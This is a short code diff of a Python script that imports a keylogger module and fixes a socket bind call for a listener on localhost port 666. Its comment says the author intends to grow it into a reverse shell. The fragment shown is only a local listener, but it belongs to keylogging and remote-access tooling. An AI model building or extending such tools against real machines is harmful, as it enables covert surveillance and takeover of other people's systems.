@@ -9,7 +9,7 @@ import keylogger
     We can extend this to full on reverse shell in the future
 """
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as main_s:
-        main_s.bind("127.0.0.1", 666)
+        main_s.bind(("127.0.0.1", 666))
         main_s.listen()
         conn, addr = main_s.accept()
         with conn:
